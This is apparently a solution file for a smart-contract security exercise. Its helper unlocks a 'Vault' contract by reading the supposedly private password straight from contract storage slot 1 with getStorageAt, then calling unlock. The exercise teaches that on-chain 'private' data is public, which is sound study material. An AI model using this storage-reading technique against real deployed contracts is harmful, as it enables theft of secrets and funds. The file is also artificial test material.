import { expect } from "chai";
import { ethers, waffle } from "hardhat";

const helper = async (victim: any) => {
  /* 
    Add code here that will help you pass the test
    Note: Unlock without using the string "A very strong password"
    Unlock the vault by somehow reading the private password from 
    Vault directly
  */

    const password = await ethers.provider.getStorageAt(victim.address, 1);
    console.log('password:', ethers.utils.parseBytes32String(password)) // decode bytes32 (doesn't work)
    await victim.unlock(password);
};

export default helper;
